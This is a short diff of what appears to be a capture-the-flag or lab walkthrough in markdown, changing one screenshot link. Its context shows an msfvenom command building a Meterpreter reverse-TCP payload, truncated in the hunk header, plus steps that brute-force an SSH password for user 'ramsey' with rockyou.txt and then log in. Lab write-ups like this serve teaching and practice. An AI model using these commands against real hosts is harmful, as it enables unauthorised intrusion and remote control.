@@ -218,7 +218,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.14.176 LPORT=9999 -f e
     ![Image](https://i.imgur.com/jsQ3Gqs.png)
 
 15. Setup the module so it attacks the host `172.17.0.1` with the username `ramsey` and the password list of `rockyou.txt` and run the attack, and it shouldn't take that long before actually getting back a result.
-    ![Image](https://i.imgur.com/L7CYKSU.png)
+    ![Image](https://i.imgur.com/tqWW5Gp.jpg)
 16. Now that we know the password we can try to SSH into the box.
 
     ![Image](https://i.imgur.com/ZPuKt8K.png)
